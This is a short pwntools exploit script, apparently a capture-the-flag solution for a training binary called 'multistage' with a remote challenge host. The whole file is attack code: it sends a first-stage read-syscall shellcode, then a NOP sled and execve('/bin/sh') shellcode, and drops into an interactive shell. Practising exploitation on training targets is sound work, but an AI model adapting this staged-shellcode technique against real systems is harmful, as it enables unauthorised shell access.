from pwn import *

context.arch = "amd64"

if(len(sys.argv) > 1):
    if(sys.argv[1] == '-d'):
        c = process("./multistage")
        gdb.attach(c, """
        b* 0x000000000040123f
        c
        """ )
        input("wait")
    elif(sys.argv[1] == '-r'):
        c = remote("multistage.training.offensivedefensive.it", 8080, ssl=True)
else:
    c = process("./multistage")

shellcode = """
    xor rdi, rdi
    push rax
    pop rsi
    xor rax, rax
    push 100
    pop rdx
    syscall
"""

shellcode2 =  """
mov rdi, rsi
add rdi, 0x22
mov rax, 0x3b
xor rsi, rsi
xor rdx, rdx
syscall
.string "/bin/sh"
"""

c.send(asm(shellcode))
c.send(20*b"\x90" + asm(shellcraft.sh()))
c.interactive()
